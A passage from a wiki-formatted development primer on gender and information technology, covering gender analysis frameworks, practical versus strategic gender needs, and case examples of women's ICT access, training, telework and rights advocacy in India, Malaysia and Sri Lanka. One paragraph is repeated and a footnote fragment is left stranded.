many development planners and agencies, governments and organizations have remained indifferent
to, or at the very least selective in, incorporating gender in their policies and programmes. Gender analysis
is not something mechanical that an individual or community can conduct properly based on just
guidelines and frameworks (see Box 8) as it can demand that the individual and the community question
their own beliefs, long-time practices and values.

{| class=&quot;wikitable&quot;
|-
! Box 8: Gender Analysis Frameworks
|-
| Gender analysis frameworks are practical instruments designed to help users integrate gender
assessment into social research and planning. Used in an appropriate way, they can identify issues,
facts and relationships that affect women and men’s lives in any given context. The understanding
and knowledge gained from using these frameworks can then be used in planning the work to
confront women’s subordination, as well as in training and as a basis for gender policy. This growing
body of literature to understand the basic concepts and methodologies include: Gender Analysis:
Alternative Paradigms prepared by Carol Miller and Shahra Razavi (1998); the Oxfam publication,
A Guide to Gender-Analysis Frameworks (1999) by Candida March, Ines Smyth and Maitrayee
Mukhopadhyay; an unpublished UK Government’s Department for International Development
document on gender planning frameworks; and the ‘EGA’ or Efficient Gender Analysis Instrument
developed by Saskia Sassen for TOOL.
The differentiation in impact of development interventions on women and men can, for example,
be assessed using a methodology derived from the Harvard Framework. This methodology has
three main profile components: (1) Activity; (2) Access and Control; and (3) Intervention. The
Activity Profile asks ‘who does what’ and attempts to identify labour and activity by disaggregating
each by sex, age, and other factors. The Access and Control Profile asks ‘who has what’ in order to
distinguish between access to resources and the benefits that are derived from control. The
Intervention Profile asks ‘who gets what’ and uses the information from the ‘activity profile’ and
‘access and control profile’ to determine the likely impact of development interventions on women
and men.

Despite the probable difficulty in internalizing and operationalizing a gender perspective and analysis,
however, it is imperative that efforts of integration continue in development. As APC WNSP states, “women
compose one-half of the world’s population and perform two-thirds of the world’s work hours, yet are
everywhere poorer in resources and poorly represented in positions of power. As these inequalities
constitute a systemic condition in all parts of the globe, it is imperative to take gender seriously in
thinking about or understanding economic development and globalization. Gender analysis should
include an examination of economics at the micro-, meso- and macro-levels and across a range of
institutional contexts (households, communities, markets and states) to illustrate women’s
disadvantageous position in ICT, and the male bias in measuring ICT outputs which renders women’s
work invisible.”&lt;ref&gt;http://www.apcwomen.org/gem/en/understanding_gem/genderanalysis.htm&lt;/ref&gt;
There are real gender inequalities and injustices in the ICT sector, and ICTs can result in further
perpetuating such inequalities and injustices. There is a need to address these gender issues in ICT, and
in order to do so, incorporating a gender perspective in planning, monitoring and implementing ICTled
projects is non-negotiable.

== What is the Difference between Practical Gender Needs and Strategic Gender Interests?==

The differentiation of practical and strategic gender needs is theoretically significant for gender analysis.
This distinction is often important in gender planning, becoming the basis for identifying actions. For
evaluation purposes, assessing the extent of responding to both practical gender needs and strategic
gender interests can inform the impact of projects and initiatives.
Practical gender needs are the needs women identify that do not challenge their socially accepted roles.
These needs relate to fulfilling their productive, reproductive and community managing roles and
responsibilities. They are practical needs that include basic living commodities such as shelter,
employment and food. While practical gender needs are related to existing gender roles, strategic gender
interests challenge those roles in favour of equity and equality for women.
Strategic gender interests begin with the assumption that women are subordinate to men as a
consequence of social and institutional discrimination against women (see Box 9).&lt;ref&gt;The CEDAW Convention, adopted in 1979 by the UN General Assembly and described as an international bill of rights for women,
defines discrimination against women as “… any distinction, exclusion or restriction made on the basis of sex which has the effect or
purpose of impairing or nullifying the recognition, enjoyment or exercise by women, irrespective of their marital status, on a basis of
equality of women and men, of human rights and fundamental freedoms in the political, economic, social, cultural, civil or any other
field” (Article 1).&lt;/ref&gt;

{| class=&quot;wikitable&quot;
|-
!Box 9: Definition of Discrimination Against Women
|-
|Discrimination can be direct or indirect and intended or unintended as defined in the CEDAW
Convention. This definition spells out in detail the meaning of discrimination against women. It
highlights three ways in which different treatment on the grounds of gender can constitute
discrimination. Intentional or unintentional disadvantaging treatment that could be classified
as follows:
# Different treatment leading to non-recognition of human rights of women both in the private and public sphere (direct discrimination), for example, the nationality law prohibits women from transmitting citizenship to their children but men can. 
# Different treatment preventing women from exercising their human rights both in the private and public spheres (direct discrimination), for example, only women in a particular country are prohibited from going abroad to work because of the risk of exploitation of foreign workers in many countries.
# Same treatment preventing women from exercising their human rights in the private and public spheres (indirect discrimination). For example, in a particular institution, playing golf is given a certain number of points for promotion irrespective of whether they are women or men. However, this gives men an advantage as it is mainly men who play golf.
As a result, any act of restriction, exclusion or distinction, whether intentional or unintentional,
that impedes the recognition of women’s human rights or denies women the exercise of any
such right is discrimination.

In practice, an approach that emphasizes practical needs may make room for recognition and
consideration of strategic interests. On the other hand, satisfying practical needs reinforces the existing
division of labour, which subordinates women. Having access to the Internet, for example, does not
automatically change the relative position of women to men. An approach that emphasizes strategic
interests, often taken up by activists, challenges existing social systems and structures in favour of equality
for women.
Project interventions may target gender disparities in one of two ways. They can address immediate
short-term needs without necessarily challenging the structural causes of gender inequality, or they can
address larger strategic issues relating to the gender interests of women and men to create conditions
for gender equality. For example, a project designed to place computer terminals in rural public school classrooms addresses the immediate need of improving access to computers without necessarily
addressing the strategic interests of improving disparities in female and male enrolment in primary and
secondary schools.
A framework that is useful in analysing gender and ICT is the newly emerging cultural analyses of
technology. This framework understands both technology and gender not as fixed and given, but as
cultural processes which (like other cultural processes) are subject to ‘negotiation, contestation, and,
ultimately transformation’. This ‘technology as culture’ perspective goes further than the current viewpoint
of women’s exclusion from full participation in technological work. In the cultural analyses of technology,
technologies are ‘cultural products’, ‘objects’ or ‘processes’ which take on meaning when experienced in
everyday life. Whereas technology has been defined as a predominantly male perspective, change comes
through a total re-evaluation and appropriate remuneration of women’s skilled and technical tasks. Given
this framework, transforming the gendered relations of technology is not merely focused on gaining
access to knowledge as it is, but with creating knowledge itself. This means being involved in the level of
definition, making meanings and creating technological culture.&lt;ref&gt;http://www.apcwomen.org/work/research/analytical-framework.html&lt;/ref&gt;

{| class=&quot;wikitable&quot;
|-
! Box 10: Women Encounter Technology
|-
|Mitter’s and Rowbotham’s anthology Women Encounter Technology explores the impact of
technology on women’s employment and the nature of women’s work in third world countries.
Their observations provide an ‘authentic international perspective’ on women and technology
that can inform further research. Some observations that are particularly relevant in gender analysis
are given below:
*Gender is one of many factors that determines the impact of IT on women’s working lives. Age, class, ethnicity and religion can play even greater roles in defining women’s working position. Similarly, the degrees of exclusivity that arise from the information revolution sharply differentiate regions and communities.
*Technological changes affect the quality and quantity of women’s work. Along with women’s employment benefits from new technologies there are associated health, environmental and other costs. Employment issues of concern to women working in technology relate to contractual terms, intensification of workloads, wages, training, and health and safety such as video display unit hazards and repetitive strain injuries.
*Increased job opportunities bring new tensions in women’s domestic lives. For example, Acero’s case study documents the typical life of a woman textile worker in Argentina: “My marriage started to break down when I started to work…I had more chances than he did. So things started to go wrong.” Deeper insights are needed into the links between women’ status and role at work and at home.
*Women are rarely represented in the decision-making areas of technology. As a number of essays document, women are predominantly only in blue-collar jobs. In the next phase of the technological change these are precisely the jobs that will be vulnerable. 
*Upgrading women’s skills through a continuous learning process benefits women and society.
*Radical thinking about training is essential for utilizing women’s potential. In particular, training needs to take into account age, class, ethnicity and religion. 
*Women’s sharing of  experiences has proved rewarding at community, national and international levels. More international exchanges of experience in organizing around some of the new issues relating to the electronic era are needed in order to ensure that women’s employment benefits from new technologies are not outweighed by the associated health and environmental costs.

==Wearing the Gender Lens and Keeping Them On==

As Sara Longwe puts it, “if we wear good spectacles, we shall be properly equipped to recognize the whole
picture of the different types of gender problems and their levels of severity” (Longwe, 2002). Longwe identifies
five levels of severity of gender problems. These are: (1) General Development Needs; (2) Women’s Special
Needs; (3) Gender Concerns; (4) Gender Inequality; and (5) Gender Issues (see Figure 1).

'''Figure 1: Levels of Severity of Gender Problems'''
{| style=&quot;border:solid 1px;&quot;
|[[Image:figure1gict.jpg|600px]]
|}


However, Longwe stresses that having the right spectacles is not enough. An added lens for analysing a
gender issue is required. Such a lens provides us the ability to examine a gender issue in terms of its
underlying causes, hence enabling the fine-tuning of a policy, programme or project in tackling a gender
issue at its root cause, rather than just addressing effects at the surface (see Figure 2).

'''Figure 2: Underlying Causes of a Gender Issue'''

Innovative interventions underway in different countries offer a micro-level view of processes of change
and prospects for transforming gender inequities into equitable opportunities and outcomes. These are
referred to as gender transformative strategies (see Box 11).

{| class=&quot;wikitable&quot;
|-
!Box 11: Gender Transformative Strategies
|-
|Gender transformative strategies are about change and transformation of existing inequalities
as opposed to gender-neutral or gender-specific policies that target one gender over another
to achieve gender goals, and in doing so, leave the gender division of labour and resources
intact.
For example, providing women with the enabling resources which will allow them to take
greater control of ICTs; to determine what kinds of ICTs they would need; and to devise the
policies to help them reach their goals. The development and implementation of ICT policies
could be evaluated by asking the following questions:
*Do these policies address gender needs?
*Will they lead to the transformation of gender relations and gender roles?
If women are to benefit from ICT interventions, mainstreaming the perspectives and concerns
of women is one of the important tasks to be undertaken. Two types of strategies are offered
to support this task: top-down and bottom-up.
Top-down strategies aim to change the ICT institutions and agencies to promote women’s
equality and empowerment in ICTs. Examples of top-down strategies might include:
*Using political pressure at international conferences and consultations to demonstrate the importance of gender-sound policies and interventions;
*Serving as a ‘watchdog’ that monitors ICT impacts on women; 
*Conducting researches and gathering data on gender concerns as central to ICTs for more effective lobby work;
*Promoting the use of gender analysis tools such as frameworks, guidelines, checklists and rosters of women, and ICT and gender experts; and
*Working within structures to effect change through gender training, financial allocations, staff appointments, and obtaining internal legal mandates.
Bottom-up strategies are aimed directly at women, supporting their entry into the mainstream
of ICT. They include:
*Removing legal or social barriers that limit women’s access to ICTs;
*Enabling women to take initiatives in their involvement in ICT planning and policies; and
*Extending financial or technical assistance to women to facilitate access to and control of ICTs by providing credit, training and education.

Gender-aware&lt;ref&gt;Kabeer defines gender-aware policies as those “based on the recognition that development actors are women as well as men, that
women and men are constrained in different and often unequal ways, as potential participants and beneficiaries in the development
process and that they may consequently have differing, and sometimes conflicting needs, interests and priorities” (1999: p.39).&lt;/ref&gt; interventions still remain an important source of learning for wider social policy, as they
aim to challenge the cultural and social norms that underpin persistent denials of women’s rights to ICTs,
and belie many of the assumptions upon which efficiency-oriented policies are based.

== Issues and Potential Solutions ==

There are commendable efforts at the grass roots to provide equitable access to ICT for women and girls
and minority groups. The term ‘minority’ is used here to represent any group which lacks socio-economic
and political voice. Used in this way, the word ‘minority’ then provides us the full extent of a contradiction
when it is realized how great in number women and girls are as the poor and the marginalized, yet how
silenced and invisible they seem to be. Women and girls are also largely representative of the rural
population where infrastructure for ICT is non-existent for most developing countries.
Some of the programmes designed for women and girls go a step further in the provision of ICT literacy
and actual training, and not just access. However, looking at the current advocacies around the globe on
gender in the area of ICT, one will find that the call for equality and equity is persistent and, sadly,
consistently ignored to a large extent. Current advocacies apply to basic issues of access, affordability,
training, employment, education, health and so on, in addition to more complex issues of information
security and freedom of communication, Internet governance, intellectual property rights&lt;ref&gt;Women’s traditional knowledge and bio-privacy issues lie on the continuum that concerns intellectual property, corporate
monopolies and the ethics of the public domain. Knowledge-sharing needs to be promoted with newer concepts like General Public
Licensing (GPL) which was designed by the Free Software Foundation, a non-profit institution that was established to promote the
publication of free software. GPL is used by programmers who want to give others the right to copy and modify the source code of
their programs. The concept also extends to written documents. Another non-profit called Creative Commons offers an alternative to
full copyright, designed to encourage creativity and adaptation (visit http://www.gnu.org/copyleft/gpl.html and
http://creativecommons.org/about/ for more information).&lt;/ref&gt; and free
and open source software (Kuga Thas, 2003).
Greater attention needs to be paid to micro-level successes and a higher consciousness needs to be
cultivated when trying to address gender issues in ICT. This section highlights persistent issues in gender
and ICT&lt;ref&gt;As articulated by the APC WNSP in the development of their ‘Mind the E-Gap’ framework to help ICT practitioners in understanding
and applying a gender analysis to their work.&lt;/ref&gt; and some illustrative examples on potential solutions.

=== Access and Control ===

Women’s access to new ICTs is most times mistakenly understood to be synonymous with making available
an Internet-abled computer for women to use. This is far from true. There are numerous and significant
factors that determine whether women can access ICTs - from education, literacy, language and skills to
financial resources, cost implications, time constraints, location and socio-cultural norms. Women’s access
to ICTs and control over them is not equal to men’s. When considering the way in which ICTs are allocated
between women and men (the ‘gendered’ allocation of ICTs), it is important to look at the difference
between access and control. ‘Access’ is the opportunity to make use of ICTs meaning not only technology
but also information and knowledge, while control refers to the power to decide how ICTs are used, and
who has access to them. Women’s access and control (or lack thereof) is dependent on factors such as
age, class, gender, geographic location, health, illiteracy, and other socially and economically-determined
categories.

Some experiences on the ground do point to the fact that availability of computers alone does not
ensure equitable access to both women and men. For example, the National Institute of Information
Technology’s Hole in the Wall Project in India installed a computer screen and keypad with an active
Internet connection into the wall of a slum or school in three different pilot sites. Through a hidden
camera, women monitored who accessed these Holes in the Wall and how. Use was evenly divided between
girls and boys at the rural pilot site, but was higher among boys than girls in the urban sites, allegedly
because when boys pushed girls aside, girls would withdraw, fearful of the physical threats that might
arise from challenging the boys (Mitra Sr., 2001). Particularly, where computer labs are just placed in
schools without further monitoring as to how these are accessed by girls and boys, the tendency is for
boys to rush for the computers, while girls do not. In Hong Kong SAR, while a growing number of
households have computers, it was found that many women are only allowed to touch the computer to
clean it.&lt;ref&gt;Anecdotal information from Chan Yu, in 2003, who was then Executive Director of the Hong Kong Federation of Women’s Centres.&lt;/ref&gt;
For women, affordability of the technology is a key factor to their access. Innovative experimental measures
such as those in India that seek to provide ICT access even though there are no telephones or electricity
in the area is worthy of mention. A project has started in Andhra Pradesh, India, using packet switching
to route Internet data and telephone calls through the spare capacity of railroad cables to areas presently
without telephone service. If successful, it would provide connectivity at rates below those of any other
option.&lt;ref&gt;http://www.cseindia.org/html/dte/dte20010215/dteanaly.htm&lt;/ref&gt;

For areas where there is no electricity, the Pondicherry project in India combines power supply from the
grid with battery backup and solar power. Pilot projects have been put in place in Mongolia as well as in
Chennai, India, and elsewhere using wireless radio modems for transmission of Internet data to remote,
sparsely populated areas where there are no landline telephones.&lt;ref&gt;http://www.panasia.org.sg/rresult/40439.htm; http://xlweb.com/food/wireless/final.htm&lt;/ref&gt; Rapid progress is also being made
towards the availability of inexpensive Internet access devices that could be installed for public access.
The Simputer, being developed for the rural poor by Ashok Jhunjhumwala and Vijay Chandru at the
Indian Institute of Science, has attracted a great deal of interest and support. With a market cost of about
US$ 200, the battery-run pocket computer/Internet access device uses free software and features a smart
card that could provide a whole village with separate personal accounts on one machine.&lt;ref&gt;‘Simputer to make browsing easy for rural folk’, The Times of India, 8 August 2000. http://www.simputer.org;
http://timesofindia.indiatimes.com/articleshow/1691262792.cms&lt;/ref&gt; The developers
feel that the availability of the device will spur content development in local languages, a necessity if
more women are to be able to access information that addresses their needs.
Outside of urban areas, women in developing countries are far less likely to come into contact with ICTs
and tend not to perceive a need for them. In some places, this is due to a lack of telephones, electricity
and infrastructure. In others, it is because women often control indigenous, traditional and popular forms
of media which, many caution, should not be ignored in the rush to embrace computer-facilitated
communication. As one woman explains, “for generations, rural women have been active participants in
social communication networks using indigenous communication methods for information exchange
and knowledge sharing. This rich cultural and creative environment should...be strengthened. The
preservation of traditional forms of communication and new IT are not mutually exclusive.”&lt;ref&gt;Quote is from the Virtual Working Group on Women and Media with a special focus on ICTs as they impact women’s lives, sponsored
by WomenWatch and facilitated by Women Action 2000 during November and December 1999. The Group’s goal is to analyse, at a
global level, which of the objectives from the Beijing Platform for Action, Section J, have been realized and which still need attention.
Access the Group’s archives at http://sdnhq.undp.org/ww/women-media&lt;/ref&gt; ICTs therefore
do not have to be just computers and the Internet. Radio, television, embedded chips, and links between
old and new technologies or the combined usage of these are important tools in reaching poor people
in developing countries. The Kothmale FM radio station in Sri Lanka&lt;ref&gt;A joint project between UNESCO, the Ministry of Posts, Telecommunications and the Media, the Sri Lanka Broadcasting Corporation,
and the Sri Lanka Telecommunications Regulatory Commission.&lt;/ref&gt; combines traditional community
radio serving a poor and isolated rural area of Sri Lanka with Internet and computer technology.

For areas where there is no electricity, the Pondicherry project in India combines power supply from the
grid with battery backup and solar power. Pilot projects have been put in place in Mongolia as well as in
Chennai, India, and elsewhere using wireless radio modems for transmission of Internet data to remote,

Close the Digital Divide’ - http://www.isoc.org/oti/articles/0401/gallagher.html&lt;/ref&gt; Local
knowledge in applying ICT in development has been quite an untapped potential.

=== Education, Training and Skill Development ===

Education, training and skill development are critical to ICT interventions. Illiteracy rates for women in
developing countries are far higher than men. Training methods are often ad hoc, alienating and not
customized to women’s needs. Learning practices for women should be extended to women and girls,
made gender-sensitive (making training women-specific, ensuring ongoing user support, and mentoring
in the communities where women live) and deepened (for women as users, technicians, policy- and
change-makers).
Training in the use of ICTs by knowledgeable trainers is a serious shortcoming. For the most part, women
have little or no previous experience with technology, and many feel confused when confronted with
the sudden appearance of computers and the Internet. Merely getting access to the hardware or
connecting groups to the Internet without an adequate introduction to what it is and how it works – and
in the absence of policies or guidance about usage, etiquette or communication techniques – is proving
insufficient to promote intelligent usage (Fontaine, 2000). Who assists with the capacity strengthening
also can be an issue, especially if all the technical ‘experts’ are males, and many are young. As one woman
explained, “we find that mainly women over 40, who are just learning to use their computers, feel really
uneasy when a young boy is the one in charge of hands-on-training.”&lt;ref&gt;Quote is from the Virtual Working Group on Women and Media with a special focus on ICTs as they impact women’s lives-sponsored
by WomenWatch and facilitated by Women Action 2000 during November and December 1999.&lt;/ref&gt;
WENT that began in 1999 as an Asia-Pacific regional training workshop, with strong support from UNESCAP,
is one model that integrated a gender perspective into their training approach. WENT aims to build the
capacities of women in the field of ICT and strengthen women’s organizations and networks in Asia and
the Pacific. The training was purposefully designed to have women ICT practitioners lead in the training
as well as the development of the training modules. Jointly managed by APC WNSP and APWINC on
behalf of AWORC, WENT is now being replicated at sub-regional and national levels as well as in other
regions of the world.&lt;ref&gt;For more information see section on ‘Enabling Women’s Social Empowerment’ above.&lt;/ref&gt;

In India, Datamation Foundation works with local non-profit partners including Nari Raksha Samiti (NRS),
Prayas, Action India, Nanhi Kali, Katha, Arise and Shine Church International, Deepalaya, Udayan, Help
Care Society, Azim Premji Foundation, and the American India Foundation, who offer free or low-cost six
to eight month IT training courses to marginalized groups of women, and recruits successful trainees for
full-time jobs within the company (Sarkar, 2003). Since the overall goal of the programme is women’s
empowerment and personal development, Datamation Foundation also provides life skills training in
topics such as healthcare, communication skills, professionalism and work ethics, and knowledge of
worker’s and women’s rights. An ongoing mentoring and training system has also been established to
ensure the necessary support towards new employees. However, of Datamation’s nearly 2,000 employees,
only 35 percent are women, but 85 percent of these women are from disadvantaged backgrounds.
In education, at the primary and secondary levels, radio and television are an increasingly important
means of reaching the rural poor. In Thailand, for example, educational radio has been utilized to teach
mathematics to school children, and for teacher training and other curricula&lt;ref&gt;The example of the use of radio comes from Nwaerondu, N. G. and Thompson, G. 1987. ‘The Use of Educational Radio in Developing
Countries: Lessons from the Past’. Journal of Distance Education, Vol. 2(2): pp. 43-54.&lt;/ref&gt; (Kenny, 2001). In such
programmes, however, it is important to see if existing patterns of gendered division of labour obstructs
access to learning for women and girls. Radio educational programmes that are conducted in a series
with little repetition tends to favour learning for men and boys, as women and girls often cannot follow
a radio programme diligently enough due to their multiple gender roles and responsibilities of
reproductive, productive and community. The timing of when these programmes are held should also
be a consideration.

=== Industry and Labour ===

In the ICT industry, labour is highly sex-segregated. Women are found in disproportionately high numbers
in the lowest paid and least secure jobs. The gender dimension of ICT also affects telework, flexi-time,
and work from home arrangements where women have few rights, meagre pay, and no health, social or
job securities. A woman’s wage labour outside (or inside) the home as a result of the new technologies
does not entail a change in the family division of labour. Men still get out of doing the housework, and
women find themselves with dual or triple burdens. Poor working conditions, long hours and monotonous
work routines associated with ICTs are often injurious to women’s health.
While many countries in Asia scramble for strategies to attract international telework that is currently
globally distributed, women too are looking towards these new opportunities to work from the home, in
trying to balance their multiple gender roles and responsibilities at the household, in work, and in the
larger society. Governments are seriously looking at national policies to enable teleworking on a larger
scale.&lt;ref&gt;Due to the prevailing notions that home-based work is essentially women’s work, it is likely that companies adopting telework
systems would prefer women.&lt;/ref&gt; However, such policies must not only consider the practical gender needs of women, but their
strategic gender interests. The ‘working conditions’ at the home front needs to be well-defined and be
made more conducive for women in terms of protecting their rights as workers (including their right to
leisure), and the implementation of such policies should not further perpetuate the general misconception
that ‘a woman’s place is in the home’. Nor should such policies contribute further to limiting the mobility
of women outside of the home or reduce her independence and self-determination within the home.&lt;ref&gt;This may be particularly true for cases of abuse within the home and violence against women issues.&lt;/ref&gt;

While the system provides women with the possibility of managing their homes and earning a living,
there is a danger that their contributions to society will remain invisible. It would not change their existing
gender inequity in the home or the prevailing stereotypes that domestic work is essentially women’s
work. e-Homemakers in Malaysia&lt;ref&gt;In 2003, e-Homemakers conducted an evaluation plan called ‘A Study on How Gender Dynamics Affect Teleworkers’ Performance in
Malaysia’ to test APC WNSP’s Gender Evaluation Methodology (GEM) tool. The main objective of the evaluation was to explore how
women’s family lives and home situations affect teleworking and their job performance. GEM is a guide to integrate a gender analysis
into evaluations of initiatives that use ICTs for social change. The guide is available online at http://www.apcwomen.org/gem&lt;/ref&gt; is one group whose work since 1998 is aimed at supporting women
who choose or want to work from home to balance their gender roles and responsibilities, and is currently
working in tandem with a similar policy thrust and emphasis of Malaysia’s Ministry of Women and Family
Development.&lt;ref&gt;Given that women in Asia continue to fulfil traditional gender roles, promoting teleworking for women should be done with full
recognition that it will not fully challenge gender issues and concerns in relation to work and family. Home-based work can clearly
address practical gender needs without necessarily challenging socially (and internally) accepted roles of women and men in the
home. Home-based work can become a compromise for women so they can continue to fulfil their roles as mothers and homemakers.
The long-term effects in terms of gender relations within the family will not be truly evident until further evaluation and monitoring is
done. What is necessary, however, is to make sure that indicators and benchmarks in terms of changes in gender relations as a result
of teleworking are developed and evaluation of teleworking from a gender perspective is continuous (APC WNSP, 2003).&lt;/ref&gt; For teleworking to help in achieving gender equality in the family, however, both women
and men must challenge gender roles and stereotypes and start with the premise of equality between
wives and husbands in all aspects of family life – in decision-making, in household work and in family
responsibilities. If this is not embedded alongside the promotion of teleworking, all teleworking for women
can do at best is to provide an opportunity for women to balance their gender-based roles and
responsibilities better, and at worst, be used to justify women’s multiple burdens of having both a family
and career life (APC WNSP, 2003).

=== Content Development and Language ===

Online content development and language used facilitate knowledge sharing. However, the content
that predominates on the Internet and in the new media is northern-ruled, male-dominated, anglophone,
and culturally biased. This affects the expansibility and proliferation of knowledge since access and use
is limited. Hans-Dieter Evers in his paper on ‘Transition towards a Knowledge Society: Malaysia and
Indonesia Compared’ (2002) is convinced that “the treasure trove of knowledge is jealously safeguarded
by the powerful industrial nations,” and as a result, today, mega companies who control budgets exceeding
those of many governments&lt;ref&gt;63Among the biggest 100 economic units (in the year 2000) are 49 countries and 51 corporations (Spiegel, D. 2001 in Evers, 2002: p.14).
Government ministries, let alone universities and research institutes are dwarfed by the research and development divisions of these
large conglomerates (Evers, 2002: p.14).&lt;/ref&gt; “increasingly determine what knowledge is created and who will have
access to it.” Representation of women’s viewpoints, knowledge and interests remain inadequate. The use of ICTs for pornography and sexual exploitation is another critical dimension of content that can
provoke controversial debates around issues of Internet censorship. Language barriers to information
access would require the development of more sophisticated applications such as multilingual tools
and databases, interfaces for non-Latin alphabets, graphic interfaces for illiterate women and automatic
translation software.
The approach of the Kothmale FM radio station in Sri Lanka&lt;ref&gt;For more information, see http://www.kothmale.ne&lt;/ref&gt; has proven to be capable of overcoming
linguistic barriers in using the Internet by non-English speakers (see earlier section on ‘Access and Control’).
The radio station adds value to the information by interpreting it into a local context, by broadcasting it
in vernacular languages, and by providing a platform for feedback through local discussion and networks
of local correspondents. While translation software, even to/from relatively obscure languages, is
becoming more easily available, original local language content will certainly go a much longer way to
making ICTs relevant to local communities everywhere.

=== Power and Decision-making ===

In Nattering on the Net (1996), Dale Spender notes that women’s marginalization from the new
communication technologies is “less to do with women and more to do with computers” arguing the
computers are the site of wealth, power, and influence. She warns that women cannot afford “to permit
white male dominance of these technologies because a very distorted view of the world is created when
only one social group, with one set of experiences pronounces on how it will be for all.”&lt;ref&gt;http://www.apcwomen.org/resources/research/analytical-framework.html&lt;/ref&gt; ICTs are important
tools: for power and control, for making money, for effecting change, and for women’s equality and
empowerment. Involvement in the power and decision-making processes of ICT is exclusionary – mostly
representing white, wealthy, influential, professional, and English/American-speaking males.&lt;ref&gt;‘Louder Voices: Strengthening Developing Country Participation in International ICT Decision-Making’ (2002), a study by the
Commonwealth Telecommunications Organization and Panos London gives a good overview of which institutions are key players in
ICT decision-making, especially differentiating those who make decisions on hard policy issues with those who make decisions on
soft policy issues.&lt;/ref&gt; Whether
at the global or national levels, women are under-represented in all ICT decision-making structures
including policy and regulatory institutions, ministries responsible for ICT, boards and senior management
of private ICT companies, etc. Deregulation and privatization of the telecommunications industry is
making decision-making in this sector less accountable to citizens and local communities, further
compounding decision-making and control of resources for women.
Gaining access and utilization of ICTs for women serves “to conscientize women in the possibility of
changing how the world is shaped and how the world shapes women.” In particular, ICTs have a major
role in reducing the vulnerability of the poor – especially to natural disasters and powerlessness. One of
the reasons for this is the part that ICTs can play in amplifying the voices of the poor. ICTs bridge the
distance between remote communities and service providers – markets, government departments, and
aid agencies. They can allow the opinions of the poor and the needs of the poor to be heard.

For example, in India, the women’s rights NGO Sakashi had faced difficulties in lobbying for sexual
harassment legislation. With help from international women’s networks provided over the Internet, Sakashi
was able to receive advice and technical assistance on legal issues surrounding sexual harassment (Kenny,
2001). As a result, the group succeeded in convincing the Supreme Court to establish sexual harassment
guidelines in the workplace and brought the issue within the purview of human rights violations. Another
critical way in which poor women can profit greatly from the application of ICTs is having access to
government information online, such as land registration through the Computer-aided Administration
of Registration Department functioning in Andhra Pradesh, India since 1998.
In India, Delhi-based NRS, founded 50 years ago to help women in distress, focuses on promoting the
safety and security of women, family welfare, employment, health, and training in job-oriented
professions. Under the leadership of Vandana Sharma, NRS established a small computer education centre
and volunteers have trained 250 young women, many of them with a history of oppression, in basic
computer literacy as well as office software such as Excel, Word, and Power Point. This IT training
programme is part of the strategy to enable women who are dowry victims and have a history of
harassment and exploitation, to find employment and economic independence. The NRS computer
centres not only provide job training, but have also allowed NRS to establish an online complaint system for solving dowry and family dispute issues. Women can confidentially lodge complaints through the
system and receive assistance from NRS, the police and government authorities (Sarkar, 2003).
Other case studies show how groups use ICTs to uphold women’s rights. For example, Datamation
Foundation has initiated a campaign against members of the medical community indulging in selective
sex determination tests in India as well as against the selective abortion of female foetuses in contravention
of the law and natural justice. Save the Girl Child Campaign uses ICTs innovatively and has a dedicated
website for the campaign (http://www.indiafemalefoeticide.org). The website not only covers the
regulatory aspects, but also includes a complaint lodging process. This process protects the identity of
the complainant as well as provides an effective vehicle for the booking of doctors, maternity homes,
ultrasound and radiology clinics.
The complaints are retrieved into a database format at Datamation, from where they are handed over to
the competent authority for further action at their end. The responses from the authorities are also sent
back to Datamation to enable updating of the database within a month’s time, failing which, an automatic
reminder for the competent authority gets published. Plans to sensitize people from rural areas on sexselective
abortions include the use of Internet radio and Internet video. Staff and volunteers of Datamation
Foundation are also taking the Campaign to rural areas using a portable computer mart called a ‘computer
thela’. The equipment is taken to the panchayat level for the dissemination of information about the site.
More than 750 cases of selective sex-determination tests and consequent illegal abortion of the female
foetuses have been registered at the site. The site has been linked to other women’s rights websites
across the country such as Nanhi Kali, NRS, Nari Dakshata Samiti etc. to draw enhanced traffic as well as
to enable tracking of individual complaints effectively.

=== Freedom of Expression, Privacy and Security ===

Privacy, security and Internet rights are other important thematic areas for women. They include having
secure online spaces where women feel safe from harassment, enjoy freedom of expression, and have
privacy of communication and protection from ‘electronic snooping’. They also include the passage of
ICT legislation that can threaten human rights. ICTs facilitate the development and progression of
democracy, and when used effectively, can enable women’s political participation, irrespective of their
literacy levels, on a much wider scale. However, before the potential of ICTs to do this can be fully achieved,
there are already efforts to curb the use of ICTs in this respect.

=== Trafficking, Pornography and Censorship ===

The large and growing presence of pornography on the Internet has been used to argue for the need to
censor online content by technologically filtering these and tracking down creators and clients of
pornographic websites. However, technology that filters content does this on a blanket scale, and includes
indiscriminately blocking access to websites that deal with educational and rights-based content on
sex, sexuality and other related issues. With the absence of any viable alternatives to control the use of
the Internet for trafficking and pornography, many women’s organizations and people in general, tend
to demand that the State provide protection and to curtail such use without fully realizing the sociopolitical
leverage that the common person can wield through the Internet.&lt;ref&gt;The Internet was successfully used as a means to form a coalition of activists when thousands of Internet users protested Yahoo’s
decision to sell pornography. In December 2000, Yahoo created an online store devoted to selling pornographic videos and DVDs. Just
a few months later, after receiving over 100,000 emails from Internet users, Yahoo decided to remove the portion of its website that
sold pornography and to stop accepting advertisements from pornographic websites. In May 2001, Yahoo decided to make it more
difficult to find sexually explicit chat rooms and online clubs (Gurumurthy, 2004: p.27).&lt;/ref&gt;
However, the response to date, gives governments full reign in over-developing legislation and
regulations, much of which is open to wide interpretation in regard to what the State might consider
‘harmful’ or ‘illegal’ (Ramilo, 2002). Depending on extent of political freedoms in a country context, these
new legislations and regulations can have serious implications for human rights defenders.

== What do Ground-up Experiences Tell Us? ==

Addressing gender equality means challenging existing social institutions and power dynamics, and
therefore explicitly demands the conscious identification and implementation of affirmative measures
for women. When men start asking ‘why only women?’ the answer needs to be rooted in the effects of
historical and continued discriminations (and its variations) on women and girls. If women are to benefit
from ICT interventions, integrating the perspectives and concerns of women is one of the important
tasks to be undertaken. Two types of strategies are offered to support this task: top-down and bottomup.&lt;ref&gt;See Box 11.&lt;/ref&gt;

Social change as illustrated by APC WNSP below (Figure 3), includes critical reflection, implying the self
and self-transformation. The element of self/self-transformation is a critical element as it relates to the
personal self (as individual) and the human self (as social construct), as well as the stakeholders/audience
of a particular ICT intervention. The changes that happen to the ‘self’ and how the ‘self’ affects other
components are central to the gender analysis of ICT interventions. Like gender, the ‘self’ has different
roles and responsibilities that can be evaluated and seen in different ways.

In making an appraisal of a project plan, an evaluator can often see the phenomenon of ‘fade-away’ in
the project’s attention to gender issues. In other words, gender issues appear quite prominent in the
situation analysis, but gradually fade away as the text progress towards goals, intervention strategies
